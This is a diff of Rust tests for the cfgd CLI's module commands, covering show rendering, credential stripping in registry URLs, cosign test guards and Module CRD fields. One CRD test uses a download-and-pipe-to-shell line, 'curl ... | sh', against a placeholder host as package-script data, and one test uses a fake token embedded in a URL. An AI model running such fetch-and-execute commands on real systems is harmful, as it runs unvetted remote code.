@@ -272,6 +272,8 @@ spec:
             scan: false,
             exit_code: false,
             show_values: false,
+            show_scripts: false,
+            show_all: false,
         }),
         config: config_dir.path().join("cfgd.yaml"),
         config_explicit: false,
@@ -284,6 +286,7 @@ spec:
         list_envelope: false,
         no_hints: false,
         theme: None,
+        mask_env_values: None,
         jsonpath: None,
         yes: false,
         state_dir: None,
@@ -327,6 +330,8 @@ fn test_cli(dir: &std::path::Path) -> super::Cli {
             scan: false,
             exit_code: false,
             show_values: false,
+            show_scripts: false,
+            show_all: false,
         }),
         config: dir.join("cfgd.yaml"),
         config_explicit: false,
@@ -339,6 +344,7 @@ fn test_cli(dir: &std::path::Path) -> super::Cli {
         list_envelope: false,
         no_hints: false,
         theme: None,
+        mask_env_values: None,
         jsonpath: None,
         yes: false,
         state_dir: None,
@@ -489,7 +495,14 @@ fn rendered_list(cli: &super::Cli) -> String {
 fn rendered_show(cli: &super::Cli, name: &str) -> String {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
-    cmd_module_show(cli, &printer, name, false).unwrap();
+    cmd_module_show(
+        cli,
+        &printer,
+        name,
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
     cfgd_core::test_helpers::captured_text(&buf)
 }
@@ -546,41 +559,39 @@ fn module_list_borrows_synced_from_the_scan_the_store_recorded() {
     }
 }
 
-/// `module show`'s Status row answers the same question off the same store,
-/// so the two surfaces cannot call one machine state by two names.
+/// `module list` may borrow one recorded status column; `module show` may
+/// borrow none. Whatever the store recorded — an installed module, a scoped
+/// scan, a machine-wide one — the DECLARED render states none of it, so a
+/// re-added Status row fails here rather than in a golden.
 #[test]
-fn module_show_borrows_synced_from_the_scan_the_store_recorded() {
+fn module_show_states_no_recorded_status_whatever_the_store_recorded() {
     let (dir, cli) = setup_recorded_modules(&["alpha", "beta"]);
     let _home = cfgd_core::with_test_home_guard(dir.path());
 
     let unchecked = rendered_show(&cli, "alpha");
-    assert!(
-        unchecked.contains("Installed"),
-        "a record no check covers states its own fact, got:\n{unchecked}"
-    );
-
     recorded_state(&cli)
         .record_scoped_scan(["module:alpha"])
         .unwrap();
     let scoped = rendered_show(&cli, "alpha");
-    assert!(
-        scoped.contains("Synced"),
-        "the scanned module keeps the verdict its own scan earned, got:\n{scoped}"
-    );
-    let neighbour = rendered_show(&cli, "beta");
-    assert!(
-        neighbour.contains("Installed") && !neighbour.contains("Synced"),
-        "one module's scan is no evidence about its neighbour, got:\n{neighbour}"
-    );
-
     recorded_state(&cli).record_scan().unwrap();
-    for name in ["alpha", "beta"] {
-        let machine = rendered_show(&cli, name);
-        assert!(
-            machine.contains("Synced"),
-            "a machine-wide scan covers every module, got:\n{machine}"
-        );
+    let machine = rendered_show(&cli, "alpha");
+
+    for (what, rendered) in [
+        ("an installed record", &unchecked),
+        ("a scoped scan", &scoped),
+        ("a machine-wide scan", &machine),
+    ] {
+        for word in ["Status", "Installed", "Synced", "Last Applied"] {
+            assert!(
+                !rendered.contains(word),
+                "{what} must not reach a `show`; found {word:?} in:\n{rendered}"
+            );
+        }
     }
+    assert_eq!(
+        unchecked, machine,
+        "a `show` renders the same bytes whatever the store recorded"
+    );
 }
 
 #[test]
@@ -634,7 +645,14 @@ fn cmd_module_show_not_found() {
     let (printer, _buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    let err = cmd_module_show(&cli, &printer, "ghost", false).unwrap_err();
+    let err = cmd_module_show(
+        &cli,
+        &printer,
+        "ghost",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap_err();
     assert!(
         err.to_string().contains("not found"),
         "should report not found, got: {err}"
@@ -656,7 +674,14 @@ fn cmd_module_show_displays_details() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    cmd_module_show(&cli, &printer, "devtools", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "devtools",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -703,7 +728,14 @@ fn cmd_module_show_local_does_not_load_locked_remotes() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    cmd_module_show(&cli, &printer, "local-mod", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "local-mod",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -729,7 +761,14 @@ fn cmd_module_show_falls_through_to_locked_modules() {
 
     // A name that is not local must still consult the full loader — proven by
     // the locked entry's own failure surfacing instead of "not found".
-    let err = cmd_module_show(&cli, &printer, "private-mod", false).unwrap_err();
+    let err = cmd_module_show(
+        &cli,
+        &printer,
+        "private-mod",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap_err();
     assert!(
         err.to_string().contains("not a git URL"),
         "a non-local name must reach the locked-module loader, got: {err}"
@@ -749,7 +788,14 @@ fn cmd_module_show_with_available_hint() {
     let (printer, _buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    let err = cmd_module_show(&cli, &printer, "missing", false).unwrap_err();
+    let err = cmd_module_show(
+        &cli,
+        &printer,
+        "missing",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap_err();
     drop(printer);
     let meta = err
         .downcast_ref::<crate::cli::CliErrorMeta>()
@@ -783,7 +829,14 @@ fn cmd_module_show_env_masking() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    cmd_module_show(&cli, &printer, "secrets-mod", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "secrets-mod",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
     let output = cfgd_core::test_helpers::captured_text(&buf);
     assert!(
@@ -806,7 +859,17 @@ fn cmd_module_show_env_unmasked() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    cmd_module_show(&cli, &printer, "env-mod", true).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "env-mod",
+        crate::cli::InventoryDetail {
+            masking: crate::cli::EnvValueMasking::revealing(),
+            scripts: cfgd_core::output::ScriptsForm::Condensed,
+        },
+        false,
+    )
+    .unwrap();
     drop(printer);
     let output = cfgd_core::test_helpers::captured_text(&buf);
     assert!(
@@ -828,7 +891,14 @@ fn cmd_module_show_json_schema() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);
 
-    cmd_module_show(&cli, &printer, "jmod", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "jmod",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -1844,6 +1914,45 @@ fn cmd_module_registry_list_json() {
     assert!(arr[0]["url"].as_str().unwrap().contains("example.com"));
 }
 
+/// The two halves of the URL rule from the outside: the table strips the
+/// credentials a declared registry URL carries, and the `-o json` payload keeps
+/// the URL whole for a consumer that has to fetch with it.
+///
+/// Pinned as a pair against ONE declared registry, because each half alone
+/// passes on a listing that strips everywhere or nowhere.
+#[test]
+fn a_credentialed_registry_url_renders_stripped_and_serializes_whole() {
+    const DECLARED: &str = "https://tj:ghp_s3cr3t@example.com/team.git";
+    let dir = setup_config_dir();
+    let cli = test_cli(dir.path());
+    cmd_module_registry_add(&cli, &make_printer(), DECLARED, Some("team")).unwrap();
+
+    let (printer, buf) =
+        cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+    cmd_module_registry_list(&cli, &printer).unwrap();
+    drop(printer);
+    let human = cfgd_core::test_helpers::captured_text(&buf);
+    assert!(
+        human.contains("https://example.com/team.git"),
+        "the table renders the URL without its userinfo: {human}"
+    );
+    assert!(
+        !human.contains("ghp_s3cr3t") && !human.contains("tj:"),
+        "no credential reaches the terminal: {human}"
+    );
+
+    let cli_json = test_cli_json(dir.path());
+    let (printer, cap) = cfgd_core::output::Printer::for_test_doc();
+    cmd_module_registry_list(&cli_json, &printer).unwrap();
+    drop(printer);
+    let json = cap.json().expect("doc captured json");
+    assert_eq!(
+        json.as_array().and_then(|a| a.first()).map(|e| &e["url"]),
+        Some(&serde_json::json!(DECLARED)),
+        "the payload keeps the declared URL byte-for-byte: {json}"
+    );
+}
+
 #[test]
 fn cmd_module_registry_list_no_config() {
     let dir = tempfile::tempdir().unwrap();
@@ -1867,7 +1976,7 @@ fn cmd_module_registry_list_no_config() {
 fn cmd_module_keys_list_no_keys() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
-    cmd_module_keys_list(&printer).unwrap();
+    cmd_module_keys_list(&printer, None).unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -1928,18 +2037,28 @@ fn cmd_module_search_no_registries_json() {
 #[test]
 #[serial_test::serial]
 fn cmd_module_keys_generate_no_cosign_fails() {
-    // Parallel CosignTestShim tests set CFGD_COSIGN_BIN; force require_cosign
+    // Parallel CosignTestShim tests set CFGD_COSIGN_BIN; force provision_cosign
     // through the PATH-only branch, and empty PATH so the missing-tool error
     // fires whether or not the host has cosign. Spawn-exclusion guard first
     // so it drops last, bracketing the empty-PATH window.
     let _spawn_excl = cfgd_core::test_helpers::path_env_mutation_guard();
+    // The memos outlive the empty-PATH window they were filled outside of, so
+    // a sibling's probe would answer "brew is available" here and cfgd would
+    // spawn it.
+    let _dirs = cfgd_core::test_helpers::BootstrappedPathDirsGuard::capture_and_clear();
+    let _paths = cfgd_core::test_helpers::CommandPathMemoTtlGuard::always_expired();
+    let _avail = cfgd_core::test_helpers::AvailabilityMemoTtlGuard::always_expired();
+    // A manager answers available from its own install prefix as well as from
+    // PATH, so an emptied PATH alone would still leave one for cfgd to spawn.
+    let _managers = cfgd_core::test_helpers::NoHostManagers::pinned_missing();
     let _g = cfgd_core::test_helpers::EnvVarGuard::unset("CFGD_COSIGN_BIN");
     let _path = cfgd_core::test_helpers::EnvVarGuard::set("PATH", "");
     let printer = make_printer();
     let err = cmd_module_keys_generate(&printer, None).unwrap_err();
     assert!(
-        err.to_string().contains("cosign not found"),
-        "should report cosign missing, got: {err}"
+        err.to_string()
+            .contains(&cfgd_core::providers::tool_unobtainable_reason("cosign")),
+        "should report cosign missing and name the managers that install it, got: {err}"
     );
 }
 
@@ -2197,7 +2316,14 @@ fn cmd_module_show_json_with_lockfile_entry() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);
 
-    cmd_module_show(&cli, &printer, "remote-mod", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "remote-mod",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -2237,7 +2363,14 @@ fn cmd_module_show_table_with_lockfile_entry() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    cmd_module_show(&cli, &printer, "locked-mod", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "locked-mod",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -2249,13 +2382,12 @@ fn cmd_module_show_table_with_lockfile_entry() {
         output.contains("v2.0"),
         "should show pinned ref, got: {output}"
     );
+    // The commit and the integrity digest are what the LOCKFILE recorded, not
+    // what the module declares, so they render on `cfgd module list` and
+    // `cfgd status` rather than here.
     assert!(
-        output.contains("aabbccdd"),
-        "should show commit, got: {output}"
-    );
-    assert!(
-        output.contains("sha256:cafebabe"),
-        "should show integrity, got: {output}"
+        !output.contains("aabbccdd") && !output.contains("sha256:cafebabe"),
+        "a recorded lock fact renders on no `show`, got: {output}"
     );
 }
 
@@ -2271,7 +2403,14 @@ fn cmd_module_show_aliases() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    cmd_module_show(&cli, &printer, "alias-mod", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "alias-mod",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -2301,7 +2440,14 @@ fn cmd_module_show_scripts() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    cmd_module_show(&cli, &printer, "script-mod", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "script-mod",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -2310,8 +2456,12 @@ fn cmd_module_show_scripts() {
         "should have a scripts section, got: {output}"
     );
     assert!(
-        output.contains("postApply — echo setup"),
-        "each row names the hook it runs under, got: {output}"
+        output.contains("postApply"),
+        "the declaring hook heads its steps, got: {output}"
+    );
+    assert!(
+        output.contains("echo setup"),
+        "each step is a row of its own, got: {output}"
     );
     assert!(
         output.contains("make install"),
@@ -2331,7 +2481,14 @@ fn cmd_module_show_files_with_git_source() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    cmd_module_show(&cli, &printer, "git-file-mod", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "git-file-mod",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -3162,6 +3319,157 @@ fn cmd_module_create_with_apply_and_yes_drives_full_apply_sequence() {
     );
 }
 
+/// `cfgd module create --apply` leaves alone the rows its scope never resolved.
+///
+/// The run resolves no profile at all: its desired set is the module the
+/// command line named plus whatever that module depends on, so both halves of
+/// the removal claim are ones it cannot make. Left at the builder's `true`
+/// default it retired every `env-var` and `alias` row on the machine, which is
+/// what `cfgd source remove` reads to find what a subscription put there, and
+/// it resolved the standing findings of the entries it never checked.
+///
+/// Two runs, because the second half only shows on a converged env surface: the
+/// first creates the module whose entries the file then holds, and the second
+/// depends on it, so its plan carries a package install and no env write at
+/// all, which is the state the trailing resolve arm answers in.
+#[test]
+#[serial_test::serial]
+fn module_create_apply_keeps_the_rows_its_scope_never_resolved() {
+    let _pm_guard =
+        crate::cli::registry::PackageManagerFactoryGuard::hermetic_native_quoting_versions();
+    let dir = setup_config_dir();
+    let _home = cfgd_core::with_test_home_guard(dir.path());
+    let cli = super::Cli {
+        state_dir: Some(dir.path().join("state")),
+        ..test_cli(dir.path())
+    };
+    std::fs::write(
+        dir.path().join("cfgd.yaml"),
+        "apiVersion: cfgd.io/v1alpha1\nkind: Config\nmetadata:\n  name: t\nspec:\n  profile: default\n",
+    )
+    .unwrap();
+
+    let create = |args: &super::ModuleCreateArgs| {
+        let (printer, _buf) =
+            cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
+        cmd_module_create(&cli, &printer, args).expect("create-with-apply must succeed");
+    };
+
+    // The module whose entries the env surface then holds.
+    let mut base = make_module_create_args("scoped-base-mod");
+    base.apply = true;
+    base.yes = true;
+    base.description = Some("base".to_string());
+    base.env = vec!["QP6_SCOPED_VAR=1".to_string()];
+    base.aliases = vec!["qp6scoped=echo scoped".to_string()];
+    base.packages = vec!["qp6-base-tool".to_string()];
+    create(&base);
+
+    // Another layer's entries, recorded and standing, plus a finding for each
+    // entry the second run DOES declare: the run converges neither.
+    let foreign = [
+        (
+            cfgd_core::reconciler::ENV_VAR_RESOURCE_TYPE,
+            "QP6_ACME_HOME",
+        ),
+        (cfgd_core::reconciler::ALIAS_RESOURCE_TYPE, "qp6acmeup"),
+    ];
+    let declared = [
+        (
+            cfgd_core::reconciler::ENV_VAR_RESOURCE_TYPE,
+            "QP6_SCOPED_VAR",
+        ),
+        (cfgd_core::reconciler::ALIAS_RESOURCE_TYPE, "qp6scoped"),
+    ];
+    {
+        let state = crate::cli::open_state_store(cli.state_dir.as_deref(), cli.scope())
+            .expect("open state");
+        // The first run WROTE the env surface, so its own entries were recorded
+        // by the converging half no scope gates. Clearing them is what makes
+        // the question asked of the second run "does it record these off a
+        // surface it never touched", which is the half the flag gates.
+        for (rtype, _) in declared {
+            state
+                .prune_managed_resources_except(rtype, &[])
+                .expect("clear the rows the converging run recorded");
+        }
+        for (rtype, id) in foreign {
+            state
+                .upsert_managed_resource(rtype, id, "acme", None, None)
+                .expect("seed tracking row");
+        }
+        for (rtype, id) in foreign.iter().chain(declared.iter()) {
+            state
+                .record_drift(
+                    rtype,
+                    id,
+                    Some("declared"),
+                    Some("missing or changed"),
+                    "acme",
+                )
+                .expect("seed drift row");
+        }
+    }
+
+    // The scoped run: it depends on the base module, so the base module's
+    // entries are in its declared set and the env surface is already converged.
+    let mut scoped = make_module_create_args("scoped-create-mod");
+    scoped.apply = true;
+    scoped.yes = true;
+    scoped.description = Some("scoped".to_string());
+    scoped.depends = vec!["scoped-base-mod".to_string()];
+    scoped.packages = vec!["qp6-scoped-tool".to_string()];
+    create(&scoped);
+
+    let state =
+        crate::cli::open_state_store(cli.state_dir.as_deref(), cli.scope()).expect("reopen state");
+    let tracked: Vec<(String, String)> = state
+        .managed_resources_by_source("acme")
+        .expect("read tracking rows")
+        .into_iter()
+        .map(|r| (r.resource_type, r.resource_id))
+        .collect();
+    let all_tracked: Vec<(String, String)> = state
+        .managed_resources()
+        .expect("read every tracking row")
+        .into_iter()
+        .map(|r| (r.resource_type, r.resource_id))
+        .collect();
+    let standing: Vec<(String, String)> = state
+        .unresolved_drift()
+        .expect("read drift rows")
+        .into_iter()
+        .map(|e| (e.resource_type, e.resource_id))
+        .collect();
+    for (rtype, id) in foreign {
+        assert!(
+            tracked.contains(&(rtype.to_string(), id.to_string())),
+            "a module-scoped apply retired the tracking row of an entry it never \
+             resolved: {tracked:?}"
+        );
+    }
+    for (rtype, id) in foreign.iter().chain(declared.iter()) {
+        assert!(
+            standing.contains(&(rtype.to_string(), (*id).to_string())),
+            "a module-scoped apply resolved the finding of an entry it never \
+             checked: {standing:?}"
+        );
+    }
+    // The other side of the same switch: the flag gates RECORDING as well as
+    // retiring, so a scoped run that converged nothing writes no tracking row
+    // even for the entries it declared. Those get their rows from the next
+    // whole-picture apply, the way `cfgd apply --module` leaves them. A
+    // widening of the guard that recorded here would pass both assertions
+    // above unnoticed.
+    for (rtype, id) in declared {
+        assert!(
+            !all_tracked.contains(&(rtype.to_string(), id.to_string())),
+            "a module-scoped apply recorded a tracking row for an entry it saw \
+             only part of the picture for: {all_tracked:?}"
+        );
+    }
+}
+
 #[test]
 #[serial_test::serial]
 fn cmd_module_create_apply_prices_the_package_it_installs() {
@@ -3332,7 +3640,7 @@ fn cmd_module_delete_with_purge() {
 
     let yaml = format!(
         "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: purge-mod\nspec:\n  files:\n    - source: files/config\n      target: {}\n",
-        target_file.display()
+        cfgd_core::to_posix_string(&target_file)
     );
     make_module(dir.path(), "purge-mod", &yaml);
 
@@ -3369,7 +3677,7 @@ fn cmd_module_delete_restores_symlinked_files() {
 
     let yaml = format!(
         "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: restore-mod\nspec:\n  files:\n    - source: files/config\n      target: {}\n",
-        target_file.display()
+        cfgd_core::to_posix_string(&target_file)
     );
     // Write module.yaml (module dir already created above)
     std::fs::write(dir.path().join("modules/restore-mod/module.yaml"), &yaml).unwrap();
@@ -3415,7 +3723,7 @@ fn cmd_module_delete_with_purge_removes_directory_target() {
 
     let yaml = format!(
         "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: purge-dir-mod\nspec:\n  files:\n    - source: files/config\n      target: {}\n",
-        target_dir.display()
+        cfgd_core::to_posix_string(&target_dir)
     );
     make_module(dir.path(), "purge-dir-mod", &yaml);
 
@@ -3460,7 +3768,7 @@ fn cmd_module_delete_default_mode_restores_directory_source_via_copy_dir() {
 
     let yaml = format!(
         "apiVersion: cfgd.io/v1alpha1\nkind: Module\nmetadata:\n  name: restore-dir-mod\nspec:\n  files:\n    - source: files/payload\n      target: {}\n",
-        target.display()
+        cfgd_core::to_posix_string(&target)
     );
     std::fs::write(
         dir.path().join("modules/restore-dir-mod/module.yaml"),
@@ -3732,11 +4040,11 @@ fn cmd_module_list_wide_format_emits_seven_column_table() {
 // global lock as the #[serial] PATH mutators (cli/paths.rs, cli/kubectl.rs,
 // cli/init/tests.rs) or plain `cargo test` (shared-process) races them.
 #[serial_test::serial]
-fn cmd_module_show_renders_platform_filtered_and_resolved_packages() {
+fn cmd_module_show_resolved_renders_platform_filtered_and_resolved_packages() {
     // Drives two resolve_package outcome arms in cmd_module_show:
-    // - Ok(Some(_)) clean-resolved package, prints \"<n> -> <mgr> install <r>\"
-    // - Ok(None) platform-filtered, prints \"<n>, platforms: <list> — skipped\"
-    //   on a Linux/macOS runner with a 'windows'-only entry.
+    // - Ok(Some(_)) clean-resolved package, prints "<n> via <mgr>"
+    // - Ok(None) platform-filtered, prints "<n>, platforms: <list> — skipped
+    //   (platform filter)" for the entry naming the other host.
     // The aliases + platforms format strings (lines 212-223) are also
     // exercised on the resolved entry — they're computed for every package
     // regardless of resolution outcome, even though only the Err arm emits
@@ -3756,7 +4064,14 @@ fn cmd_module_show_renders_platform_filtered_and_resolved_packages() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_at(cfgd_core::output::Verbosity::Normal);
 
-    cmd_module_show(&cli, &printer, "rich", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "rich",
+        crate::cli::InventoryDetail::default(),
+        true,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -3766,8 +4081,12 @@ fn cmd_module_show_renders_platform_filtered_and_resolved_packages() {
     #[cfg(any(target_os = "linux", target_os = "macos"))]
     {
         assert!(
-            output.contains("curl → "),
-            "resolved entry should render '<name> -> <mgr> install ...', got: {output}"
+            output.contains("curl") && output.contains(" via "),
+            "a resolved entry states the manager it landed on, got: {output}"
+        );
+        assert!(
+            !output.contains("install"),
+            "a `show` performs nothing, so no row spells an install verb, got: {output}"
         );
         assert!(
             output.contains("notepad") && output.contains("skipped (platform filter)"),
@@ -3781,12 +4100,20 @@ fn cmd_module_show_renders_platform_filtered_and_resolved_packages() {
     #[cfg(target_os = "windows")]
     {
         assert!(
-            output.contains("notepad → "),
-            "resolved entry should render '<name> -> <mgr> install ...', got: {output}"
+            output.contains("notepad") && output.contains(" via "),
+            "a resolved entry states the manager it landed on, got: {output}"
+        );
+        assert!(
+            !output.contains("install"),
+            "a `show` performs nothing, so no row spells an install verb, got: {output}"
         );
         assert!(
             output.contains("curl") && output.contains("skipped (platform filter)"),
             "platforms-filtered entry should report 'skipped (platform filter)', got: {output}"
+        );
+        assert!(
+            output.contains("platforms: linux/macos"),
+            "skipped entry should render platform_str with the host-rejected list, got: {output}"
         );
     }
     #[cfg(not(any(target_os = "linux", target_os = "macos", target_os = "windows")))]
@@ -4165,7 +4492,14 @@ fn cmd_module_show_json_depends() {
     let (printer, buf) =
         cfgd_core::output::Printer::for_test_with_format(cfgd_core::output::OutputFormat::Json);
 
-    cmd_module_show(&cli, &printer, "dep-show", false).unwrap();
+    cmd_module_show(
+        &cli,
+        &printer,
+        "dep-show",
+        crate::cli::InventoryDetail::default(),
+        false,
+    )
+    .unwrap();
     drop(printer);
 
     let output = cfgd_core::test_helpers::captured_text(&buf);
@@ -4372,8 +4706,8 @@ fn module_show_output_json_fields() {
         directory: "/home/user/.config/cfgd/modules/test-mod".to_string(),
         source: "remote".to_string(),
         depends: vec!["base".to_string()],
-        state: None,
         spec: config::ModuleSpec::default(),
+        resolved: None,
     };
     let json = serde_json::to_value(&output).unwrap();
     assert_eq!(json["name"], "test-mod");
@@ -4454,13 +4788,29 @@ fn cmd_module_update_combined_operations() {
 #[serial_test::serial]
 fn cmd_module_keys_rotate_no_cosign_fails() {
     let _spawn_excl = cfgd_core::test_helpers::path_env_mutation_guard();
+    // The memos outlive the empty-PATH window they were filled outside of, so
+    // a sibling's probe would answer "brew is available" here and cfgd would
+    // spawn it.
+    let _dirs = cfgd_core::test_helpers::BootstrappedPathDirsGuard::capture_and_clear();
+    let _paths = cfgd_core::test_helpers::CommandPathMemoTtlGuard::always_expired();
+    let _avail = cfgd_core::test_helpers::AvailabilityMemoTtlGuard::always_expired();
+    // A manager answers available from its own install prefix as well as from
+    // PATH, so an emptied PATH alone would still leave one for cfgd to spawn.
+    let _managers = cfgd_core::test_helpers::NoHostManagers::pinned_missing();
     let _g = cfgd_core::test_helpers::EnvVarGuard::unset("CFGD_COSIGN_BIN");
     let _path = cfgd_core::test_helpers::EnvVarGuard::set("PATH", "");
+    // The key the verb would rotate: its absence is a precondition that
+    // refuses ahead of the install, so a pin about the missing TOOL has to get
+    // past it first.
+    let dir = tempfile::tempdir().unwrap();
+    std::fs::write(dir.path().join("cosign.key"), b"old-priv").unwrap();
     let printer = make_printer();
-    let err = cmd_module_keys_rotate(&printer, None, &[]).unwrap_err();
+    let err =
+        cmd_module_keys_rotate(&printer, Some(dir.path().to_str().unwrap()), &[]).unwrap_err();
     assert!(
-        err.to_string().contains("cosign not found"),
-        "should report cosign missing, got: {err}"
+        err.to_string()
+            .contains(&cfgd_core::providers::tool_unobtainable_reason("cosign")),
+        "should report cosign missing and name the managers that install it, got: {err}"
     );
 }
 
@@ -4469,7 +4819,7 @@ fn cmd_module_keys_rotate_no_cosign_fails() {
 #[test]
 #[serial_test::serial]
 fn cmd_module_keys_rotate_no_existing_key_fails() {
-    // Satisfy require_cosign via the seam (any existing file) so the
+    // Satisfy provision_cosign via the seam (any existing file) so the
     // missing-key check is reached whether or not the host has cosign;
     // the flow errors before ever invoking the binary.
     let dir = tempfile::tempdir().unwrap();
@@ -4609,15 +4959,20 @@ fn build_module_crd_json_uses_module_name_not_artifact_for_metadata() {
 }
 
 #[test]
-fn build_module_crd_json_packages_emit_only_name_field() {
-    // The Module CRD's package entries only carry `name` (resolution lives on
-    // the operator side via the module CRD's downstream reconcile). Other
-    // ModulePackageEntry fields (minVersion, prefer, aliases, etc.) MUST NOT
-    // leak into the CRD payload — that would either be silently ignored or
-    // (worse) trip strict-schema rejection on a future CRD version.
+fn build_module_crd_json_packages_carry_their_resolution_hints_but_no_script_install() {
+    // A package entry reaches the CRD with everything a machine needs to
+    // resolve it: the name, the per-manager aliases, the version floor, the
+    // manager preference and denial lists and the tags gating the entry. The
+    // four script-install knobs (`script`, `onlyIf`, `unless`, `creates`) stay
+    // behind — they are a shell body and the guards that decide whether to run
+    // it, and nothing cluster-side installs a package.
     let mut pkg = make_pkg("ripgrep");
     pkg.min_version = Some("13.0".into());
     pkg.prefer = vec!["brew".into(), "cargo".into()];
+    pkg.script = Some("curl -fsSL https://example.invalid/rg.sh | sh".into());
+    pkg.only_if = Some("command -v curl".into());
+    pkg.unless = Some("command -v rg".into());
+    pkg.creates = Some("~/.local/bin/rg".into());
     pkg.deny = vec!["apt".into()];
     pkg.platforms = vec!["darwin".into()];
 
@@ -4626,39 +4981,53 @@ fn build_module_crd_json_packages_emit_only_name_field() {
 
     let pkgs = v["spec"]["packages"].as_array().expect("packages array");
     assert_eq!(pkgs.len(), 1);
-    let entry = pkgs[0].as_object().expect("package entry object");
-    assert_eq!(entry.len(), 1, "package entry must contain only `name`");
-    assert_eq!(entry.get("name").unwrap(), "ripgrep");
-    assert!(!entry.contains_key("minVersion"));
-    assert!(!entry.contains_key("prefer"));
-    assert!(!entry.contains_key("deny"));
-    assert!(!entry.contains_key("platforms"));
+    assert_eq!(
+        pkgs[0],
+        serde_json::json!({
+            "name": "ripgrep",
+            "minVersion": "13.0",
+            "prefer": ["brew", "cargo"],
+            "deny": ["apt"],
+            "platforms": ["darwin"],
+        }),
+        "the resolution hints travel; the four script-install knobs do not"
+    );
 }
 
 #[test]
-fn build_module_crd_json_files_emit_only_source_and_target() {
-    // Module CRD file entries are source+target pairs only. Per-file `strategy`,
-    // `private`, `encryption` etc. are local-side concerns and must not leak.
+fn build_module_crd_json_files_carry_every_local_deployment_knob() {
+    // A file entry reaches the CRD whole: the strategy that deploys it, the
+    // permissions it lands with, whether its source is local-only, and the
+    // encryption its source must satisfy. A module read back out of the
+    // cluster deploys the same file the same way.
     let f = config::ModuleFileEntry {
         patch: None,
         source: "vimrc".into(),
         target: "~/.vimrc".into(),
         strategy: Some(config::FileStrategy::Symlink),
         private: true,
-        encryption: None,
-        permissions: None,
+        encryption: Some(config::EncryptionSpec {
+            backend: "sops".into(),
+            mode: config::EncryptionMode::InRepo,
+        }),
+        permissions: Some("600".into()),
     };
     let doc = module_doc_with("m", vec![], vec![f], vec![]);
     let v = super::push_pull::build_module_crd_json(&doc, "art", None).expect("build crd json");
 
     let files = v["spec"]["files"].as_array().expect("files array");
     assert_eq!(files.len(), 1);
-    let entry = files[0].as_object().expect("file entry object");
-    assert_eq!(entry.len(), 2, "file entry must contain only source+target");
-    assert_eq!(entry.get("source").unwrap(), "vimrc");
-    assert_eq!(entry.get("target").unwrap(), "~/.vimrc");
